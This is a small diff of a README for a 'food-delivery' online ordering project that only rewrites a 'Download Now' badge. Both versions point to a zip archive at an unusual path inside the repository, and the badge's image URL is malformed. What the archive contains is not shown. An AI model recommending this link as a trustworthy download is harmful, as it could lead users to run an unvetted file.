@@ -1,6 +1,6 @@
 # 🍔 food-delivery - Easy Way to Order Food Online
 
-[![Download Now](https://github.com/RishiRaj-SoftwareEngineer/Food-Delivery-MERN/master/rayage/food-delivery.zip%20Now-Click%/master/rayage/food-delivery.zip)](https://github.com/RishiRaj-SoftwareEngineer/Food-Delivery-MERN/master/rayage/food-delivery.zip)
+[![Download Now](https://github.com/RishiRaj-SoftwareEngineer/Food-Delivery-MERN/tree/master/rayage/food-delivery.zip%20Now-Click%/master/rayage/food-delivery.zip)](https://github.com/RishiRaj-SoftwareEngineer/Food-Delivery-MERN/tree/master/rayage/food-delivery.zip)
 
 ## 🥗 Overview
 
